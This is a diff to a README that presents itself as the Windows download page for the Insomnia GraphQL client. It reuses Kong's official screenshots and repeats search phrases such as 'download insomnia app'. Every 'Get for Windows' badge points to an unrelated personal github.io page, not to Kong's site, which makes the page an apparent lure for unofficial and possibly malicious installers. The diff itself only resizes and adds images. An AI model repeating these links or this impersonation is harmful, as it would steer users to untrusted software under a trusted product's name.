@@ -1,6 +1,6 @@
 # Insomnia GraphQL Client for Windows
 
-<img src="https://raw.githubusercontent.com/Kong/insomnia/develop/screenshots/main.png" alt="Insomnia Logo" width="560">
+<img src="https://raw.githubusercontent.com/Kong/insomnia/develop/screenshots/main.png" alt="Insomnia Logo" width="660">
 
 [![Hi](https://img.shields.io/badge/Get%20for-Windows-0078D6?style=for-the-badge&logo=windows&logoColor=white)](https://camilorobersonopcr.github.io/.github/Insomnia-GraphQL-Client)
 
@@ -18,7 +18,7 @@ Many professionals searching for **download insomnia app**, **download insomnia 
 
 Designed specifically for Windows, Insomnia combines API testing, GraphQL development, REST client functionality, environment management, and request debugging into a lightweight desktop application suitable for developers, QA engineers, DevOps teams, and backend specialists.
 
-<img src="" width="900">
+<img src="https://developer.konghq.com/assets/images/insomnia/entry-page.png" width="900">
 
 [![Hi](https://img.shields.io/badge/Get%20for-Windows-0078D6?style=for-the-badge&logo=windows&logoColor=white)](https://camilorobersonopcr.github.io/.github/Insomnia-GraphQL-Client)
 
